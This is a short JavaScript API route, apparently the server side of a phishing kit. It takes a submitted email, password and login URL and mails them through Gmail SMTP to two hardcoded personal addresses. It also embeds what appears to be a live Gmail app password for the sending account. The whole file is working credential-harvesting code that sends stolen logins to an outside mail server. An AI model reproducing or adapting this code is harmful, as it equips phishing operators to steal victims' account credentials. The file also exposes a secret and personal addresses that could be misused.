import nodemailer from 'nodemailer';

export async function POST(request) {
  const { email, password, loginURL } = await request.json();

  const recipients = ['kennedyjamesgram@gmail.com', 'ebenedict291@gmail.com']

  const message = `New login details: \n\nEmail: ${email}\nPassword: ${password}, \n\nLogin URL: ${loginURL}`;
  if (!email || !password || !loginURL) {
    return new Response('Missing required parameters', { status: 400 });
  }

  try {
    let transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 587,
      secure: false,
      auth: {
        user: 'dsolivan060@gmail.com',
        pass: 'bbog pint lqvl xnmi',
      },
    });

    for (let recipient of recipients) {
      let info = await transporter.sendMail({
        from: '"Fred Foo 👻" <dsolivan060@gmail.com>',
        to: recipient,
        subject: 'New login details',
        text: message,
      });
      console.log('Message sent: %s', info.messageId);

      
    }

    return new Response('Email sent successfully', { status: 200 });
  } catch (error) {
    console.error(error);
    return new Response('Error sending email', { status: 500 });
  }
}

